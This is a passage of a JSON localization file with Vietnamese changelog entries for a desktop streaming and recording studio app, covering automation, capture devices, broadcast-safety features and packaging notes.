được ghép cho người xem của bạn, có bật/tắt riêng từng dòng. <em>Mức sử dụng GPU cố ý không có: chúng tôi không đo nó, nên chúng tôi không đoán.</em>","changelog.7d975b57ccd9":"<strong>Nguồn trình hiển thị âm thanh</strong> (CAP-N15). Cột phổ FFT cổ điển, máy hiện sóng hoặc đồng hồ VU stereo, gắn với bất kỳ dải kênh nào của bàn trộn, bus rãnh hoặc bản trộn tổng. Lấy tín hiệu <strong>sau fader</strong> — một nguồn bị tắt tiếng sẽ hiển thị phẳng, đúng như những gì nó phát ra. FFT radix-2 của riêng ứng dụng; không có ML ở bất kỳ đâu.","changelog.dcc7f22ee0b8":"<strong>Trình thiết kế tiêu đề &amp; bảng tỷ số</strong> (CAP-N16). Các mẫu nhiều lớp (chữ, ảnh, hình dạng) với chữ có viền và đổ bóng, hiệu ứng vào/ra (mờ dần, trượt, gạt), các trường gắn với một tệp được theo dõi (ô CSV, con trỏ JSON) hoặc một biến của studio, và điều khiển trực tiếp — đổi tên, sửa tỷ số, kích hoạt hiệu ứng — mà không động tới cảnh.","changelog.977703b6d007":"<strong>Nguồn danh sách phát media</strong> (CAP-N17). Một danh sách phát có thứ tự phát <strong>thực sự liền mạch</strong> (toàn bộ danh sách đã cắt chạy qua một lần giải mã duy nhất, nên ranh giới giữa các mục chính xác tới từng khung hình), với điểm vào/ra và điểm nhắc cho từng mục, lặp / xáo trộn / giữ mục cuối, phím tắt tiếp theo-trước đó, và một biến “đang phát” mà bất kỳ nguồn Văn bản nào cũng hiển thị được.","changelog.ded0bd268198":"<strong>Nguồn đồng hồ bấm giờ từng chặng cho speedrun</strong> (CAP-N18). Nhập một tệp LiveSplit <code>.lss</code> và chạy nó: so sánh với kỷ lục cá nhân, các chặng tốt nhất hoặc trung bình, làm nổi bật chặng vàng, và các phím tắt toàn cục cho chia chặng / hoàn tác / bỏ qua / đặt lại. Tệp <strong>chỉ</strong> được đọc — một lượt chạy không bao giờ được ghi ngược lại. <em>Bộ tự chia chặng đọc bộ nhớ tiến trình cố ý không được hỗ trợ (vì gần với vùng chống gian lận); việc chia chặng dựa trên tệp và phím tắt.</em>","changelog.c303cbf74e59":"<strong>Làm nổi bật con trỏ &amp; hiệu ứng nhấp chuột</strong> (CAP-N19). Quầng sáng con trỏ, gợn sóng khi bấm có mã màu cho chuột trái/phải, và tùy chọn hiện phím bấm được vẽ lên nguồn ghi màn hình và cửa sổ — những thứ tối thiểu cho người làm video hướng dẫn, trên đường xử lý con trỏ riêng của ứng dụng. Chỉ trên Windows, nói thẳng là vậy (macOS và Linux tự ghép con trỏ của chúng); phím bấm được vẽ ra, không bao giờ bị ghi nhật ký.","changelog.f998b484bc62":"<strong>Phép co giãn sharp-bilinear còn mờ hơn cả bilinear thường</strong> (hồi quy trong CAP-N70 của 0.200.0). Shader đo <em>cạnh</em> của texel thay vì tâm, nên phần lớn mỗi texel rơi vào vùng hòa trộn 50/50 ở biên. Giờ nó giữ nguyên tâm của mỗi texel và chỉ chuyển sang texel bên cạnh trong một đường nối hẹp, đúng với mục đích của chế độ này. Các bài kiểm thử khung hình chuẩn mới cho từng bộ co giãn (còn nợ từ 0.200.0) cố định hành vi này.","changelog.e64eb694c7c5":"Ghi chú đóng gói","changelog.7a371e20c4e6":"<strong>MSI cho Windows mang ProductVersion <code>0.230.0</code> ở bên trong.</strong> Windows Installer giới hạn số phiên bản phụ của MSI ở 255, mà bậc 0.300.0 vượt quá — đây là bản phát hành đầu tiên mà cách đánh số “+100 mỗi giai đoạn” chạm tới giới hạn đó. Quy tắc ánh xạ là <code>MSI minor = 200 + app-minor ÷ 10</code> (0.400.0 → <code>0.240.0</code> … 0.900.0 → <code>0.290.0</code>, rồi 1.0.0 → <code>1.0.0</code>), tăng nghiêm ngặt để các bản nâng cấp MSI vẫn tiếp tục thay thế bản cài cũ. Chỉ phiên bản nội bộ của MSI là khác: ứng dụng, trình cài đặt NSIS, trình cập nhật và mục Giới thiệu đều ghi <strong>0.300.0</strong>.","changelog.04f0b1865198":"[0.200.0] — 2026-07-13 (Tự động hóa + Ghi hình &amp; thiết bị chuyên sâu — CAP-N Giai đoạn 1 &amp; 9)","changelog.685bf42fe455":"Hai giai đoạn theo chủ đề trong một bản phát hành, nên số phiên bản vượt qua hai bậc (0.99.0 → 0.200.0). <strong>Giai đoạn 1 — Tự động hóa</strong> giúp studio tự vận hành: bộ máy quy tắc, macro có biến, bề mặt điều khiển MIDI và OSC, tổ hợp phím và lớp phím tắt, bảng cảm ứng LAN, dịch vụ đèn tally, điều khiển camera PTZ và kịch bản chương trình theo thời gian. <strong>Giai đoạn 9 — Ghi hình &amp; thiết bị chuyên sâu</strong> hoàn thiện đường đi từ ống kính tới khung vẽ: màn hình giám sát truyền thẳng độ trễ thấp, co giãn chính xác từng điểm ảnh, phóng to cắt khung, tự động cắt viền đen, tự liên kết cửa sổ↔âm thanh ứng dụng, và ánh xạ tông màu HDR→SDR. Phát hành cùng <strong>phông nền cảnh</strong> và <strong>phát ngược media thực sự</strong> được xây dựng trước đó trong chu kỳ.","changelog.79232fa7e8c0":"<strong>Toàn bộ bề mặt tự động hóa dùng chung một bất biến thiết kế:</strong> mọi quy tắc, macro, phím MIDI, địa chỉ OSC, nút bảng điều khiển và bước kịch bản đều được điều phối qua một danh sách lệnh cho phép cố định duy nhất — chính danh sách mà API WebSocket điều khiển từ xa cung cấp. Không bề mặt điều khiển nào có thể chỉ định một tệp, khởi chạy một tiến trình hay kết nối ra internet, <strong>theo đúng thiết kế</strong>, và mọi bề mặt mạng đều tắt theo mặc định và chỉ gắn với loopback trừ khi LAN được bật tường minh.","changelog.9bb9593116bc":"<strong>Phông nền / hình nền cảnh.</strong> Ghim bất kỳ ảnh, GIF lặp hay video lặp nào phía sau nguồn ghi hình làm phông nền toàn khung vẽ hoặc nửa màn hình (trái / phải / trên / dưới), với nguồn ghi hình tự động được đặt vào nửa còn lại. Thu phóng bằng con lăn chuột trên nguồn ghi hình hoặc phông nền, bộ lọc Lật thời gian thực, chế độ “giữ cho đến khi bắt đầu ghi” với bản xem trước trước khi ghi, và nút ẩn/hiện để một video hướng dẫn có thể phát toàn khung trước khi nguồn ghi hình quay lại.","changelog.3cc0eae313a7":"<strong>Phát ngược media thực sự + điều khiển phát đầy đủ.</strong> Kết xuất ngược thực sự (bộ nhớ có giới hạn, chia đoạn, có bộ nhớ đệm) cùng tua, nhảy tới bất kỳ vị trí nào, phát/tạm dừng và nút bật/tắt lặp — một video phông nền hoạt động như một trình phát bình thường, theo hiệu lệnh của người vận hành.","changelog.e9af708a1747":"<strong>Bộ máy quy tắc tự động hóa</strong> (CAP-N01). Chín trình kích hoạt theo sườn — chuyển cảnh, trạng thái phát, trạng thái ghi, lỗi nguồn, mức âm thanh vượt ngưỡng, hệ thống rảnh, cửa sổ được focus, thời điểm trong ngày và một tệp được theo dõi thay đổi — được lọc qua các điều kiện (một biến bằng giá trị, đang phát, đang ghi) để chạy các thao tác của studio. Mọi quy tắc khi xuất xưởng đều <strong>bị tắt</strong>; bộ máy không làm gì cho đến khi có một quy tắc được bật.","changelog.cdab0d32015e":"<strong>Macro, biến &amp; chuỗi thao tác</strong> (CAP-N02). Các chuỗi bước có tên (chạy một thao tác, chờ, đặt một biến) với số lần lặp và phím tắt toàn cục tùy chọn, chạy được từ giao diện, phím tắt, quy tắc hoặc API điều khiển từ xa. Các <strong>biến</strong> của studio chèn <code>{{name}}</code> vào bất kỳ nguồn Văn bản nào và cập nhật trực tiếp ngay khi một macro đặt giá trị.","changelog.d7decf42ec57":"<strong>Bề mặt điều khiển MIDI</strong> (CAP-N03). Dùng MIDI-learn để gán một phím, núm xoay hay fader cho một thao tác studio, macro, chuyển cảnh, fader bàn trộn hoặc tắt tiếng, với <strong>phản hồi qua đèn LED và fader có motor</strong> phản ánh trạng thái thật của studio (phím REC sáng vì bạn đang ghi). Không cổng MIDI nào được mở cho đến khi bạn chọn một cổng.","changelog.3f509d62695d":"<strong>Điều khiển OSC</strong> (CAP-N04). Các bộ điều khiển kiểu TouchOSC và bàn điều khiển ánh sáng điều khiển studio qua Open Sound Control — <code>/scene/switch</code>, <code>/record/start</code>, <code>/macro/run</code>, <code>/mixer/vol</code> và nhiều hơn nữa. Tắt theo mặc định, chỉ loopback trừ khi bật LAN. <em>OSC không có cơ chế xác thực riêng — nút bật/tắt LAN nói rõ điều đó.</em>","changelog.e19b0ee81809":"<strong>Tổ hợp phím &amp; lớp phím tắt</strong> (CAP-N05). Tổ hợp hai lần nhấn (<code>Ctrl+K, 3</code>) trong đó phím thứ hai đơn lẻ chỉ bị chiếm khi tổ hợp đang chờ, cùng các lớp phím cố định để một bàn phím nhỏ điều khiển được nhiều thao tác.","changelog.012efed7e76a":"<strong>Bảng cảm ứng LAN</strong> (CAP-N06). Ứng dụng cung cấp một trang điều khiển — nút cảnh với tally trực tiếp, fader bàn trộn và phím thao tác — cho bất kỳ điện thoại nào trong mạng, truy cập qua mã QR. Tắt theo mặc định, mọi yêu cầu đều cần mật khẩu, chỉ loopback trừ khi bật LAN, và trang được nhúng sẵn (không có gì được tải từ internet).","changelog.6784a15679f3":"<strong>Dịch vụ đèn tally</strong> (CAP-N07). Một trang tally đỏ/xanh toàn màn hình mà bất kỳ chiếc điện thoại dư nào cũng hiển thị được; <code>?scene=NAME</code> theo dõi một cảnh, nếu không thì nó theo trạng thái trực tiếp của chương trình.","changelog.0b65086c92dd":"<strong>Điều khiển camera PTZ</strong> (CAP-N08). Xoay ngang / nghiêng / thu phóng camera qua VISCA-over-IP với các vị trí đặt sẵn có tên và tự động gọi lại theo từng cảnh (một cảnh lên chương trình sẽ gọi lại góc máy đã gắn với nó). Chỉ trong LAN; một camera chỉ tồn tại vì địa chỉ của nó đã được nhập — không có gì được tự dò tìm.","changelog.23f2bea95258":"<strong>Kịch bản chương trình</strong> (CAP-N09). Một danh sách bước có thứ tự — một cảnh và thời gian nó được giữ, cùng các thao tác tùy chọn — chuyển bước thủ công hoặc tự động, với dòng “tiếp theo + thời gian còn lại” trực tiếp. Chạy kịch bản sẽ chuyển cảnh theo cách thông thường, có thể hoàn tác; nó không bao giờ sửa bộ sưu tập cảnh.","changelog.2e60fbc8afc7":"<strong>Màn hình giám sát truyền thẳng độ trễ thấp</strong> (CAP-N69). Một máy chiếu hiển thị khung hình <strong>thô</strong> của một thiết bị ghi hình — không cảnh, không bộ lọc, không bộ ghép hình — với chỉ số độ trễ ghi hình→hiển thị được đo, để có thể xem tín hiệu trò chơi từ card ghi hình với độ trễ tối thiểu.","changelog.0e3a7f16e7d8":"<strong>Chế độ co giãn chính xác từng điểm ảnh</strong> (CAP-N70). Co giãn mượt, láng giềng gần nhất, khớp bội số nguyên hoặc sharp-bilinear cho từng mục — nội dung retro/pixel-art lên khung vẽ mà không bị nhòe.","changelog.ffa3f0ee68cd":"<strong>Phóng to cắt khung &amp; xoay theo</strong> (CAP-N71). Dùng con lăn để phóng to vào bất kỳ nguồn ghi hình nào với chuyển động tắt dần tới hạn, ba cấu hình sẵn qua phím tắt và chế độ theo dõi tùy chọn bám theo con trỏ.","changelog.d331c3ab49e3":"<strong>Tự động cắt viền đen</strong> (CAP-N72). Phát hiện và cắt viền đen trên/dưới hoặc hai bên của một nguồn, một lần hoặc liên tục khi tỷ lệ khung hình của nội dung thay đổi.","changelog.c5425a9fc61b":"<strong>Tự liên kết cửa sổ↔âm thanh ứng dụng</strong> (CAP-N73). Ghi âm thanh ứng dụng của một cửa sổ cùng với cửa sổ đó; ẩn cửa sổ sẽ tắt tiếng dải kênh liên kết và hiện cửa sổ sẽ bật lại tiếng — không bao giờ ghi đè một lần tắt tiếng thủ công.","changelog.372de0cef652":"<strong>Ánh xạ tông màu HDR→SDR khi ghi hình</strong> (CAP-N74). Ánh xạ đầu ra của một màn hình HDR vào khung vẽ SDR (cắt / maxRGB giữ sắc độ / Reinhard / điểm gập BT.2408) với mức trắng giấy điều chỉnh được, tinh chỉnh trực tiếp theo từng màn hình mà không cần khởi động lại nguồn ghi hình.","changelog.1ee387582d9c":"Bảo mật &amp; độ tin cậy","changelog.647e3c52982e":"Mọi bề mặt tự động hóa đều đi qua danh sách cho phép dùng chung của API điều khiển từ xa (<code>ALLOWED_COMMANDS</code>), nên không quy tắc, macro, gán MIDI/OSC, nút bảng điều khiển hay bước kịch bản nào chạm tới được một lệnh mà chính các nút của ứng dụng không chạm tới — được kiểm chứng bằng một bài kiểm thử bảo đảm danh sách cho phép và các nhánh điều phối của nó không thể lệch nhau.","changelog.3ebb5ae804a8":"Trình kích hoạt <code>FileChanged</code> tuân theo lớp bảo vệ đường dẫn từ xa sẵn có, nên việc theo dõi một tệp không bao giờ thăm dò một đường dẫn UNC (không làm lộ thông tin xác thực NTLM).","changelog.894554d366f3":"Cả hai bề mặt điều khiển LAN (bảng điều khiển, OSC) đều cảnh báo trong Cài đặt rằng lưu lượng LAN không được mã hóa trước khi cổng được mở ra mạng.","changelog.f8d204cd91ea":"[0.99.0] — 2026-07-12 (Nguồn, thiết bị &amp; hiệu chỉnh — CAP-M Đợt 3)","changelog.26f64316b751":"Đợt tính năng bắt buộc thứ ba và cũng là cuối cùng: mọi thứ nằm giữa ống kính và khung vẽ. Tín hiệu thử tích hợp và một bàn làm việc đồng bộ hình-tiếng có hướng dẫn để hiệu chỉnh toàn bộ chuỗi; nguồn hẹn giờ/đồng hồ và nguồn chữ gắn với tệp cho các chương trình chạy theo dữ liệu; một bản đồ phím tắt rà soát mọi cách gán phím; các tính năng còn thiếu của bàn trộn; và chiều sâu thực sự cho thiết bị — khử xen kẽ và điều khiển camera đa nền tảng với hồ sơ theo từng thiết bị.","changelog.bc670f3d3c34":"<strong>Nguồn tín hiệu thử</strong> (CAP-M21). Thanh màu kiểu SMPTE, lưới/đường gạch chéo hiệu chỉnh, dải quét chuyển động, âm chuẩn 1 kHz (−20 dBFS) và mẫu kết hợp <strong>chớp sáng+tiếng bíp đồng bộ hình-tiếng</strong> được tạo từ một đồng hồ duy nhất — kiểm tra cảnh, bộ mã hóa, máy chiếu và đích phát mà không cần cắm camera.","changelog.5c359f960e3e":"<strong>Bàn làm việc hiệu chỉnh đồng bộ hình-tiếng</strong> (CAP-M20). Một công cụ có hướng dẫn phát mẫu chớp sáng+tiếng bíp qua màn hình và loa của bạn, theo dõi camera và micrô của bạn thu lại nó, đo độ lệch hoàn toàn bằng xử lý tín hiệu (phát hiện điểm khởi đầu qua nhiều chu kỳ, kèm hướng dẫn trung thực khi thất bại — phòng tối, micrô im lặng, tiếng ồn trong phòng không phải là mẫu), và đề nghị áp dụng kết quả vào độ lệch đồng bộ của micrô. Thanh trượt thủ công vẫn là phương án dự phòng. Trung thực về vòng lặp: độ trễ của màn hình/loa của bạn cũng nằm trong phần được đo.","changelog.5f3aaabe7c80":"<strong>Nguồn hẹn giờ &amp; đồng hồ</strong> (CAP-M15). Một họ nguồn chữ: đồng hồ treo tường (định dạng strftime + độ lệch UTC cố định), đếm ngược (tới một khoảng thời lượng hoặc mốc giờ kế tiếp, với một thao tác khi về 0 — nhấp nháy mặt hiển thị hoặc chuyển cảnh), đồng hồ bấm giờ đếm lên, và thời gian kể từ khi lên sóng / kể từ khi bắt đầu ghi. Bắt đầu/tạm dừng/đặt lại từ thuộc tính của nguồn hoặc hai phím tắt toàn cục mới (tất cả các bộ hẹn giờ cùng lúc). Mặt hiển thị chỉ vẽ lại khi chữ của nó thay đổi.","changelog.e4a01e4da67e":"<strong>Chữ lấy từ tệp + gắn dữ liệu</strong> (CAP-M16). Một nguồn Văn bản có thể gắn với một tệp cục bộ được theo dõi: toàn bộ tệp <code>.txt</code>, một ô CSV (theo tên cột tiêu đề hoặc chỉ số) hoặc một giá trị JSON (con trỏ RFC 6901) — được đọc lại trong vòng nửa giây sau khi thay đổi, chịu được các trình soạn thảo ghi nguyên tử (tệp tạm + đổi tên) bằng cách giữ giá trị hợp lệ gần nhất trên màn hình. Nền móng cho bảng tỷ số/dòng chữ chân màn hình, không cần dịch vụ nào. Trình nhập từ OBS giờ cũng ánh xạ cả “đọc từ tệp”.","changelog.99703cca8970":"<strong>Bản đồ phím tắt</strong> (CAP-M14). Một bảng duy nhất, tìm kiếm và lọc được, chứa <strong>mọi</strong> cách gán phím — thao tác toàn cục và nhấn để nói/nhấn để tắt tiếng theo từng nguồn — với tín hiệu xung đột trung thực: cùng một tổ hợp được viết theo hai cách sẽ bị gắn cờ là dùng chung, và một phím mà hệ điều hành từ chối đăng ký (do ứng dụng khác sở hữu, hoặc không có trên bộ ghép hình này) sẽ được báo rõ. Xuất một bảng ghi nhớ Markdown vào thư mục Downloads. Cài đặt → Phím tắt dùng để gán; công cụ này để rà soát và ghi chép.","changelog.ee68b38bf053":"<strong>Bàn trộn đầy đủ: cân bằng trái phải, solo, mono</strong> (CAP-M19). <strong>Cân bằng</strong> stereo cho từng dải kênh (ở giữa thì giống hệt từng bit như không cân bằng), <strong>solo PFL</strong> (bản giám sát chỉ nghe các dải kênh đang solo — bản trộn chương trình không bao giờ thay đổi) và <strong>trộn xuống mono</strong> cho từng nguồn.","changelog.7ab38b03302e":"<strong>Khử xen kẽ cho nguồn thiết bị</strong> (CAP-M17). Bỏ trường / bob / tuyến tính / hòa trộn / thích ứng chuyển động (kiểu yadif) theo từng thiết bị, có chọn thứ tự trường — hoàn toàn trên CPU trong luồng ghi hình, giống hệt nhau trên mọi hệ điều hành. Đổi chế độ sẽ khởi động lại thiết bị, giống như đổi định dạng.","changelog.10b030797364":"<strong>Điều khiển camera với hồ sơ theo từng thiết bị</strong> (CAP-M18). Phơi sáng, cân bằng trắng, lấy nét, thu phóng, khuếch đại (và hơn nữa) cho webcam và card ghi hình qua một đường đa nền tảng duy nhất — UVC qua API gốc trên Windows/Linux; macOS hiển thị bất cứ thứ gì AVFoundation báo về, thường là không có gì, và bảng điều khiển nói thẳng điều đó. Mọi điều chỉnh đều được lưu vào một hồ sơ theo từng thiết bị và được áp dụng lại khi cắm nóng và khởi động lại.","changelog.1d38d97fe470":"[0.98.0] — 2026-07-12 (An toàn &amp; độ tin cậy phát sóng — CAP-M Đợt 2)","changelog.4b98f0291de5":"Đợt tính năng bắt buộc thứ hai: <em>đừng để mất chương trình</em>. Studio giờ phát hiện lỗi trước khi bạn lên sóng (danh sách kiểm tra trước khi phát), trong khi bạn đang phát (cảnh báo an toàn luôn bật, chuyển bộ mã hóa dự phòng giữa phiên, bảng tình trạng nguồn), và sau khi điều tồi tệ nhất xảy ra (bản ghi chịu được sự cố với bước sửa chữa ở lần khởi động sau, cơ chế bảo vệ khi thoát hoàn tất mọi thứ theo thứ tự). Và khi bạn cần giấu mọi thứ <em>ngay lập tức</em>, đã có nút khẩn cấp.","changelog.f4de38fb000e":"<strong>Mẫu tên tệp bản ghi</strong> (CAP-M25). Đặt tên dựa trên token — <code>{prefix}</code>, <code>{date}</code>, <code>{time}</code>, <code>{scene}</code>, <code>{profile}</code>, <code>{canvas}</code>, <code>{marker-count}</code> và <code>{counter}</code> được lưu bền — cho bản ghi, lần lưu phát lại và ảnh tĩnh, với hậu tố tự động tránh trùng tên và <strong>thư mục riêng cho từng đầu ra</strong> dành cho phát lại và ảnh tĩnh. Tên được làm sạch khỏi các ký tự dành riêng của mọi nền tảng; lỗi gõ trong mẫu được phát hiện ngay khi lưu.","changelog.4750f9f5b2ce":"<strong>Bảng tình trạng nguồn</strong> (CAP-M13). Một bảng mở từ bảng lệnh với trạng thái trực tiếp, fps, <strong>tuổi khung hình cuối</strong>, số khung hình bị rớt và lịch sử khởi động lại của mọi nguồn — cùng nút Khởi động lại và Thuộc tính cho từng nguồn. Các nguồn mà bộ máy không chạy sẽ hiện trung thực là “không hoạt động”.","changelog.977c064d0ab7":"<strong>Bảo vệ khi thoát + tắt có thứ tự</strong> (CAP-M23). Đóng studio khi đang phát trực tiếp, đang ghi hoặc đã bật phát lại sẽ hỏi trước — liệt kê chính xác những gì sẽ xảy ra — rồi kết thúc luồng phát, hoàn tất bản ghi và xả bộ đệm phát lại <strong>theo thứ tự</strong> trước khi thoát. Một tệp đánh dấu sự cố giờ phân biệt được lần thoát sạch với lần gặp sự cố.","changelog.6102d929f559":"<strong>Bản ghi chịu được sự cố + lời nhắc cứu dữ liệu</strong> (CAP-M11). Bản ghi mp4/mov được ghi theo kiểu <strong>phân mảnh</strong> (xả chỉ mục ở mỗi khung hình khóa), nên một sự cố hay mất điện sẽ để lại một tệp phát được thay vì một tệp không đọc được. Nếu một phiên kết thúc không êm giữa lúc đang ghi, lần khởi động sau sẽ đề nghị <strong>sửa chữa</strong> chỉ bằng một cú nhấp thành một bản sao <code>(repaired)</code> — tệp gốc không bao giờ bị động tới.","changelog.9d1b1cce6db8":"<strong>Chuyển bộ mã hóa dự phòng giữa phiên</strong> (CAP-M12). Nếu bộ mã hóa phần cứng gặp lỗi giữa lúc phát hoặc giữa lúc ghi (driver bị đặt lại, tranh chấp GPU), phiên sẽ chuyển nóng xuống một nấc thang — họ phần cứng còn lại, rồi tới x264 — thay vì chết hẳn. Luồng phát đi theo cơ chế kết nối lại sẵn có; bản ghi tiếp tục trong một tệp mới; một thông báo trung thực + một ghi chú cố định trong dock thống kê cho biết chính xác chuyện gì đã xảy ra. Lỗi mạng không bao giờ kích hoạt việc chuyển đổi.","changelog.08f429a15748":"<strong>Cảnh báo an toàn phát sóng</strong> (CAP-M10). Các bộ giám sát luôn bật khi đầu ra đang chạy: <strong>âm thanh chương trình im lặng</strong>, <strong>vỡ tiếng kéo dài</strong>, <strong>hình chương trình đen hoặc đứng hình</strong> (thị giác máy tính cổ điển — lấy mẫu độ sáng + chênh lệch khung hình trên bước đọc lại sẵn có, không ML), và <strong>dự báo sắp hết dung lượng đĩa</strong> (“còn khoảng 22 phút ở bitrate hiện tại”). Không chặn thao tác: một biểu ngữ có thể đóng + trình thông báo cho trình đọc màn hình.","changelog.a76206a6a95f":"<strong>Nút khẩn cấp</strong> (CAP-M22). Một phím tắt toàn cục chuyển chương trình (cùng khung vẽ dọc và mọi máy chiếu) sang một màn hình riêng tư có thể cấu hình, dừng mọi nguồn ghi hình và tắt cứng mọi âm thanh — micrô thậm chí không còn được thu — trong khi luồng phát và bản ghi vẫn tiếp tục. Việc khôi phục cần xác nhận hai bước có chủ đích.","changelog.0df040fc21b0":"<strong>Gói chẩn đoán đã được che thông tin nhạy cảm</strong> (CAP-M24). “Xuất chẩn đoán” ghi một tệp zip (ảnh chụp cấu hình, kết quả thăm dò bộ mã hóa/thiết bị, thống kê gần đây, báo cáo sự cố gần nhất) được tạo theo một <strong>danh sách cho phép</strong> nghiêm ngặt — khóa phát, mật khẩu, token, đường dẫn tệp và chữ của người dùng không bao giờ được đọc, huống chi là đưa vào. Bạn có thể đọc chính xác nội dung trước khi xuất; không có gì được gửi đi đâu cả.","changelog.4047624f0a67":"<strong>Danh sách kiểm tra trước khi lên sóng</strong> (CAP-M09). Phát trực tiếp giờ chạy các bước kiểm tra trước: các đích đã có khóa, bộ mã hóa dùng được, các nguồn ổn định, đủ dung lượng đĩa — mỗi mục xanh/đỏ kèm cách sửa chỉ một cú nhấp — cùng những lời nhắc trung thực về đo mức micrô/âm thanh máy tính và bộ đệm phát lại. Một tùy chọn cài đặt giữ nút Phát trực tiếp cho đến khi mọi bước kiểm tra chặn đều xanh.","changelog.f0bd6b1eb67e":"Bản ghi mp4/mov chuyển từ ghi chỉ mục ở cuối (<code>+faststart</code>) sang ghi phân mảnh; bước sửa chữa cứu dữ liệu (hoặc Remux) tạo ra một tệp faststart kiểu cổ điển khi một trình biên tập đòi hỏi.","changelog.e2f271c14a12":"Trình xác thực <code>HotkeySettings</code> giờ cũng giới hạn các tổ hợp phím chụp ảnh tĩnh và nút khẩn cấp.","changelog.d236ab9ba3fe":"[0.97.0] — 2026-07-11 (Dựng cảnh &amp; giám sát — CAP-M Đợt 1)","changelog.4b1bad38a6e8":"Đợt đầu tiên trong ba đợt tính năng bắt buộc trên đường tới 1.0.0. Bộ ghép hình học cách được <em>chỉnh sửa</em> như một studio, chứ không chỉ được điều khiển: lịch sử hoàn tác phía sau mọi chỉnh sửa cảnh, chọn nhiều mục với căn chỉnh-phân bố và đường gióng kéo ra được, biến đổi chính xác có thể sao chép giữa các mục, và một bàn làm việc tách nền cho bạn thấy matte. Và nó học cách được <em>giám sát</em>: đa màn hình giám sát mọi cảnh, máy chiếu toàn màn hình cho bất kỳ cảnh / nguồn / chương trình / bản xem trước nào trên bất kỳ màn hình nào, và chụp ảnh tĩnh không mất dữ liệu chỉ bằng một phím. Cuối cùng, nó mở cửa với thế giới mà nó bắt nguồn từ đó — nhập một bộ sưu tập cảnh từ OBS, và tìm lại các tệp media đã bị di chuyển.","changelog.7219ebda2472":"<strong>Hoàn tác/làm lại nhiều bước cho mọi chỉnh sửa cảnh</strong> (CAP-M01). Một lịch sử ảnh chụp có giới hạn và có nhãn chạy dưới cùng khóa với bộ sưu tập; một thao tác liên tục (một lần kéo, một lần đẩy fader) được gộp thành một bước; <code>Ctrl</code>/<code>Cmd</code>+<code>Z</code> đảo ngược chỉnh sửa — không bao giờ đảo ngược chương trình đang phát (chọn cảnh chương trình, căn giữa khung nhìn và focus không nằm trong ngăn xếp). Một danh sách lịch sử xem được cho biết chính xác mỗi bước sẽ hoàn tác điều gì.","changelog.aae31a6bbe7f":"<strong>Trình nhập bộ sưu tập cảnh từ OBS</strong> (CAP-M02). Trỏ nó tới một tệp <code>scenes.json</code> của OBS và nó sẽ ánh xạ các cảnh, thứ tự lớp, trạng thái hiển thị/khóa/hòa trộn của từng mục, các nguồn màu/chữ/ảnh/media, nguồn ghi màn hình/cửa sổ/camera/âm thanh, cảnh lồng nhau, và các bộ lọc video <strong>lẫn</strong> âm thanh mà nó nhận ra — rồi trả về một <strong>báo cáo trung thực cho từng nguồn</strong>: cái gì sang được trọn vẹn, cái gì cần chọn lại thiết bị ghi hình, cái gì tham chiếu tới một tệp cần kiểm tra, và cái gì không có tương đương nên đã bị bỏ qua. Kích thước và vị trí của các mục được ước lượng từ bố cục của OBS (một tệp cảnh không mang theo kích thước gốc của nguồn lẫn khung vẽ), nên báo cáo nói rõ điều đó.","changelog.d6bb32be4ef4":"<strong>Trình sửa tệp bị thiếu</strong> (CAP-M03). Khi tải — hoặc theo yêu cầu từ bảng lệnh — nó quét bộ sưu tập để tìm các đường dẫn ảnh / media / phông chữ / LUT / mặt nạ không còn phân giải được và đề nghị liên kết lại từng cái. Sửa một đường dẫn hỏng sẽ sửa mọi cảnh đã dùng nó; “Tìm trong thư mục…” khớp hàng loạt theo tên.","changelog.6f96fd6fdf78":"<strong>Căn chỉnh có chọn nhiều mục đầy đủ</strong> (CAP-M04). Shift-nhấp và khung chọn kéo thả chọn được nhiều mục; kéo bất kỳ mục nào để di chuyển cả nhóm (bắt dính như một khối); căn cạnh/tâm của chúng với nhau hoặc phân bố đều. Và bạn có thể kéo ra <strong>đường gióng</strong> của riêng mình — kéo để di chuyển, kéo ra khỏi khung vẽ để xóa — mà các mục được kéo sẽ bắt dính vào, được vẽ trên cả bản xem trước JPEG lẫn bản xem trước GPU gốc.","changelog.13b73aeb27b0":"<strong>Bảng biến đổi chính xác có sao chép/dán</strong> (CAP-M05). Nhập vị trí so với điểm neo, kích thước, góc xoay và vùng cắt của một mục; sao chép một biến đổi hoặc cả chuỗi bộ lọc và dán sang mục khác như một bước hoàn tác duy nhất.","changelog.5b8587772325":"<strong>Bàn làm việc tách nền</strong> (CAP-M26). Tinh chỉnh khóa chroma/màu/độ sáng trên chế độ xem trực tiếp một nguồn với chế độ matte (alpha → xám), công cụ hút màu, kính lúp và đường chia trước/sau kéo được.","changelog.630487ce7411":"<strong>Đa màn hình giám sát</strong> (CAP-M06) — một lưới trực tiếp gồm mọi cảnh với tally đỏ (chương trình) / xanh (xem trước), nhấp để cắt hoặc (trong Chế độ Studio) đưa vào chuẩn bị. Có thể mở thành cửa sổ riêng trên bất kỳ màn hình nào.","changelog.cfb92d0b5e04":"<strong>Máy chiếu cho mọi thứ, ở mọi nơi</strong> (CAP-M07) — hiển thị toàn màn hình chương trình, bản xem trước của Chế độ Studio, một <strong>cảnh cụ thể</strong> hoặc một <strong>nguồn đơn lẻ</strong> trên bất kỳ màn hình nào đang kết nối (hoặc trong một cửa sổ nổi). Máy chiếu mở lại đúng chỗ bạn để chúng ở lần khởi chạy sau.","changelog.d31889806a32":"<strong>Chụp ảnh tĩnh chỉ bằng một phím</strong> (CAP-M08) — một ảnh PNG không mất dữ liệu của chương trình (hoặc của một nguồn đơn lẻ, trước/sau bộ lọc) được lưu vào thư mục bản ghi, có thể gán cho một phím tắt toàn cục.","changelog.77c37009de86":"Việc chọn mục trong cảnh giờ là cơ chế chọn nhiều mục thực thụ trên toàn bộ bản xem trước; một phép biến đổi hàng loạt ghi nhận các thao tác căn chỉnh / phân bố / di chuyển nhóm thành một bước hoàn tác duy nhất.","changelog.f1cc3f1d7724":"Đường dẫn <code>preview://</code> có thêm các khe máy chiếu độ phân giải đầy đủ cho từng đích và định tuyến máy chiếu theo từng cảnh, bên cạnh các khe chương trình / xem trước / dọc / bàn làm việc / đa màn hình giám sát sẵn có; CORS vẫn được ghim vào các origin của chính ứng dụng.","changelog.e27bd21b1216":"[0.96.0] — 2026-07-10 (Trợ năng, 18 ngôn ngữ, hướng dẫn ban đầu &amp; giao diện)","changelog.dfb83dff1086":"Giai đoạn 9: phần hoàn thiện cho ngày ra mắt. Studio giờ nói được mười tám ngôn ngữ, vận hành được hoàn toàn bằng bàn phím và nghe được qua trình đọc màn hình, tự cấu hình ở lần chạy đầu tiên, và có thể dùng giao diện sáng.","changelog.ed8d27bca3a0":"Hai trong số các 